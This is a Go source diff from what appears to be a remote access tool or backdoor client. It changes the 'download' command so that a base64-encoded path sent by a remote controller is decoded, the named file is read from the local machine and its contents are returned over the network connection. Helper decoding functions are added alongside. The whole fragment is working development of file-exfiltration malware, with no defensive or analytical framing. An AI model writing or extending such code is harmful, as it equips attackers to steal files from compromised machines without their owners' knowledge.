@@ -108,8 +108,10 @@ func Connect() {
 
 		case "download":
 			pathDownload := ReceiveMessageStdEncoding(conn)
-			fileName,_:= Utf8ToGbk([]byte(pathDownload))
-			file, err := ioutil.ReadFile(string(fileName))
+
+			pathDownload = string(DecodeToBytes(pathDownload))
+			fmt.Println("download:", len(pathDownload),"=",pathDownload)
+			file, err := ioutil.ReadFile(string(pathDownload))
 			if err != nil {
 				conn.Write([]byte("[!] File not found!" + "\n"))
 			}
@@ -180,6 +182,11 @@ func Connect() {
 	}
 }
 
+func DecodeToBytes(encData string) []byte {
+	decData, _ := base64.URLEncoding.DecodeString(encData)
+	return decData
+}
+
 func Utf8ToGbk(s []byte) ([]byte, error) {
 	reader := transform.NewReader(bytes.NewReader(s), simplifiedchinese.GBK.NewEncoder())
 	d, e := ioutil.ReadAll(reader)
@@ -212,6 +219,13 @@ func ReceiveMessageStdEncoding(conn net.Conn) string {
 	message, _ := bufio.NewReader(conn).ReadString('\n')
 	messageDecoded, _ := base64.StdEncoding.DecodeString(message)
 	return string(messageDecoded)
+}
+
+func ReceiveMessageStdEncodingByte(conn net.Conn) []byte {
+	message, _ := bufio.NewReader(conn).ReadString('\n')
+	messageDecoded, _ := base64.StdEncoding.DecodeString(message)
+	return messageDecoded
+
 }
 
 func ReceiveMessageURLEncoding(conn net.Conn) string {
